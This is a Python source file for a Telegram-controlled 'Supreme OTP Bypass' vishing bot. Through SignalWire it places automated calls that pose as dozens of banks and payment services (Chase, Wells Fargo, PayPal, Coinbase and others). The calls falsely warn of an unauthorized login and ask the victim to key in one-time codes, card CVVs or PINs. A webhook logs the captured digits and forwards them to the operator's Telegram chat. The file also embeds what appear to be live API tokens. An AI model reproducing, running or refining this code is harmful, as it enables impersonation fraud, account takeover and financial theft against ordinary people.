import logging
import os
import logging
import os
import threading
import requests
import time
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from signalwire.rest import Client as signalwire_client

# --- CONFIGURACIÓN SIGNALWIRE ---
SIGNALWIRE_PROJECT = '4c37b4d6-dc54-45f4-bb1e-3e56e16ab9b5'
SIGNALWIRE_TOKEN = 'PT81230d7283847f875cb9afddb579e62135baaee2d045ace1'
SIGNALWIRE_SPACE = 'space-otp.signalwire.com' 
SIGNALWIRE_NUMBER = '+18778273701' 

# --- CONFIGURACIÓN TELEGRAM ---
TELEGRAM_TOKEN = '8555237773:AAHZiG_nqBzGyWshGsXBzCEKnOKmOjxoHLw'
MI_CHAT_ID = "6280594821" 
ARCHIVO_LOGS = "codigos_capturados.txt"

# Inicialización de Clientes
client = signalwire_client(SIGNALWIRE_PROJECT, SIGNALWIRE_TOKEN, signalwire_space_url=SIGNALWIRE_SPACE)
server = Flask(__name__)

# --- DICCIONARIO MAESTRO SUPREMO (TODOS LOS MÓDULOS) ---
MODULOS = {
    # BANCOS USA
    "chase": {"name": "JPMorgan Chase", "msg_en": "the 6-digit verification code sent to your device", "digits": 6},
    "bofa": {"name": "Bank of America", "msg_en": "your 6-digit SafePass verification code", "digits": 6},
    "citi": {"name": "Citigroup", "msg_en": "the one-time security code for this alert", "digits": 6},
    "wells": {"name": "Wells Fargo", "msg_en": "the temporary access code sent via SMS", "digits": 6},
    "gsachs": {"name": "Goldman Sachs", "msg_en": "your identity verification code", "digits": 6},
    "mstanley": {"name": "Morgan Stanley", "msg_en": "the security code for your login request", "digits": 6},
    "usbank": {"name": "U.S. Bank", "msg_en": "the 6-digit code to confirm your identity", "digits": 6},
    "pnc": {"name": "PNC Financial", "msg_en": "the verification code sent to your phone", "digits": 6},
    "truist": {"name": "Truist Financial", "msg_en": "your security verification digits", "digits": 6},
    "capone": {"name": "Capital One", "msg_en": "the 6-digit code to authorize this security update", "digits": 6},
    "tdbank": {"name": "TD Bank", "msg_en": "your security verification code", "digits": 6},
    "bnymellon": {"name": "BNY Mellon", "msg_en": "the code to authorize your access", "digits": 6},
    "statestreet": {"name": "State Street", "msg_en": "the identity verification code", "digits": 6},
    "amex": {"name": "American Express", "msg_en": "the security code sent to your mobile device", "digits": 6},
    "citizens": {"name": "Citizens Bank", "msg_en": "your one-time security code", "digits": 6},
    "firstcit": {"name": "First Citizens Bank", "msg_en": "the 6-digit verification code", "digits": 6},
    "fifththird": {"name": "Fifth Third Bank", "msg_en": "the security alert verification code", "digits": 6},
    "keybank": {"name": "KeyBank", "msg_en": "the code sent to authorize your login", "digits": 6},
    "huntington": {"name": "Huntington Bank", "msg_en": "your 6-digit verification code", "digits": 6},
    "mtbank": {"name": "M&T Bank", "msg_en": "the security digits for this session", "digits": 6},
    "regions": {"name": "Regions Financial", "msg_en": "your verification code", "digits": 6},
    "ally": {"name": "Ally Financial", "msg_en": "the 6-digit security code", "digits": 6},
    "discover": {"name": "Discover Bank", "msg_en": "your verification digits for this alert", "digits": 6},
    "bmo": {"name": "BMO Harris Bank", "msg_en": "the code sent to your device", "digits": 6},
    "santander": {"name": "Santander Bank USA", "msg_en": "the security code to verify your identity", "digits": 6},
    "schwab": {"name": "Charles Schwab", "msg_en": "the verification code for your account", "digits": 6},
    "ntrust": {"name": "Northern Trust", "msg_en": "your security access code", "digits": 6},
    "synchrony": {"name": "Synchrony Bank", "msg_en": "the code sent for verification", "digits": 6},
    "comerica": {"name": "Comerica", "msg_en": "the 6-digit verification code", "digits": 6},
    "firsthor": {"name": "First Horizon", "msg_en": "the security digits sent to you", "digits": 6},
    "svb": {"name": "Silicon Valley Bank", "msg_en": "the identity verification code", "digits": 6},
    "signature": {"name": "Signature Bank", "msg_en": "your one-time security code", "digits": 6},
    "chime": {"name": "Chime", "msg_en": "the 6-digit code for your security alert", "digits": 6},
    "varo": {"name": "Varo Bank", "msg_en": "your login verification code", "digits": 6},
    "sofi": {"name": "SoFi", "msg_en": "the verification code for your account", "digits": 6},
    "navyfed": {"name": "Navy Federal", "msg_en": "the 6-digit verification code for this request", "digits": 6},
    
    # SERVICIOS ADICIONALES
    "paypal": {"name": "PayPal", "msg_es": "el código de seguridad de PayPal", "msg_en": "your PayPal security code", "digits": 6},
    "facebook": {"name": "Facebook", "msg_es": "el código de recuperación de Facebook", "msg_en": "your Facebook code", "digits": 6},
    "amazon": {"name": "Amazon", "msg_es": "el código de aprobación de Amazon", "msg_en": "your Amazon approval code", "digits": 6},
    "applepay": {"name": "Apple Pay", "msg_es": "el código de Apple Pay", "msg_en": "your Apple Pay code", "digits": 6},
    "coinbase": {"name": "Coinbase", "msg_es": "el código de Coinbase", "msg_en": "your Coinbase code", "digits": 6},
    "crypto": {"name": "Crypto.com", "msg_es": "el código de transferencia", "msg_en": "your transfer code", "digits": 6},
    "microsoft": {"name": "Microsoft", "msg_es": "el código de Microsoft", "msg_en": "your Microsoft code", "digits": 6},
    "venmo": {"name": "Venmo", "msg_es": "el código de Venmo", "msg_en": "your Venmo code", "digits": 6},
    "cashapp": {"name": "CashApp", "msg_es": "su código de inicio de sesión", "msg_en": "your login code", "digits": 6},
    "carrier": {"name": "Operadora", "msg_es": "el código enviado por su operadora", "msg_en": "the code sent by your carrier", "digits": 6},
    "email": {"name": "Email", "msg_es": "el código enviado a su correo", "msg_en": "the code sent to your email", "digits": 6},
    
    # DATOS DE TARJETA
    "cvv": {"name": "CVV", "msg_es": "los 3 dígitos de seguridad al reverso de su tarjeta", "msg_en": "the 3 digit security code", "digits": 3},
    "pin": {"name": "PIN", "msg_es": "su clave de cajero de 4 dígitos", "msg_en": "your 4 digit pin", "digits": 4}
}

# --- DETECCIÓN AUTOMÁTICA DE NGROK ---
def get_ngrok_url():
    try:
        response = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https': return tunnel['public_url']
        return None
    except: return None

# --- WEBHOOK: CAPTURA Y REINTENTO ---
@server.route('/otp-recibido', methods=['POST'])
def otp_recibido():
    digits = request.form.get('Digits')
    target = request.form.get('To')
    mod_key = request.args.get('mod')
    mod = MODULOS.get(mod_key)
    
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")

    if digits and len(digits) >= int(mod['digits']):
        fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ARCHIVO_LOGS, "a") as f:
            f.write(f"[{fecha}] {mod['name']} | Target: {target} | OTP: {digits}\n")
        
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                      data={"chat_id": MI_CHAT_ID, "text": f"✅ **¡CÓDIGO CAPTURADO!**\n🏦 Mod: `{mod['name']}`\n📱 Target: `{target}`\n🔑 OTP: `{digits}`", "parse_mode": "Markdown"})
        
        msg_final = "Thank you. Your account is now secure." if is_us else "Gracias, verificado correctamente."
        return f"<Response><Say language='{lang}' voice='{voice}'>{msg_final}</Say><Hangup/></Response>"
    
    else:
        webhook_base = get_ngrok_url()
        reintentar_url = f"{webhook_base}/otp-recibido?mod={mod_key}"
        error_v = "Invalid. Try again." if is_us else "Incorrecto. Intente de nuevo."
        instr_v = f"Please enter {mod['msg_en']}." if is_us else f"Ingrese {mod['msg_es']}."
        
        return f"""
        <Response>
            <Say language='{lang}' voice='{voice}'>{error_v}</Say>
            <Gather action="{reintentar_url}" numDigits="{mod['digits']}" timeout="15" method="POST">
                <Say language='{lang}' voice='{voice}'>{instr_v}</Say>
            </Gather>
            <Hangup/>
        </Response>
        """

# --- BOT DE TELEGRAM ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    keys = list(MODULOS.keys())
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(MODULOS[keys[i]]["name"], callback_data=keys[i])]
        if i+1 < len(keys): row.append(InlineKeyboardButton(MODULOS[keys[i+1]]["name"], callback_data=keys[i+1]))
        keyboard.append(row)
    
    await update.message.reply_text("🏦 **SUPREME OTP BYPASS v8.0**\nSelecciona módulo objetivo:", reply_markup=InlineKeyboardMarkup(keyboard))

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['active_module'] = query.data
    await query.message.reply_text(f"🎯 Módulo **{MODULOS[query.data]['name']}** activo.\nEnvía el número (+1...):")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    mod_key = context.user_data.get('active_module')
    webhook_base = get_ngrok_url()
    
    if not mod_key or not target.startswith('+') or not webhook_base:
        await update.message.reply_text("❌ Error: Ngrok no detectado o módulo no seleccionado.")
        return

    mod = MODULOS[mod_key]
    url_final = f"{webhook_base}/otp-recibido?mod={mod_key}"
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")
    
    intro = f"Hello, this is a security call from {mod['name']}. An unauthorized login was detected. Ref: 9021." if is_us else f"Alerta de seguridad de {mod['name']}."
    instr = f"To block this attempt, please enter {mod['msg_en']}." if is_us else f"Ingrese {mod['msg_es']}."

    twiml = f"""
    <Response>
        <Say language='{lang}' voice='{voice}'>{intro}</Say>
        <Pause length="1"/>
        <Gather action="{url_final}" numDigits="{mod['digits']}" timeout="20" method="POST">
            <Say language='{lang}' voice='{voice}'>{instr}</Say>
        </Gather>
        <Say language='{lang}' voice='{voice}'>Time out. Goodbye.</Say>
        <Hangup/>
    </Response>
    """
    
    try:
        client.calls.create(from_=SIGNALWIRE_NUMBER, to=target, url=url_final, method='POST', twiml=twiml)
        await update.message.reply_text(f"🚀 Llamando a `{target}` vía {mod['name']}...")
    except Exception as e:
        await update.message.reply_text(f"❌ Error SignalWire: {e}")

if __name__ == "__main__":
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=5000, use_reloader=False), daemon=True).start()
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("🚀 BOT SUPREMO ONLINE - TODOS LOS MÓDULOS LISTOS")
    app.run_polling()
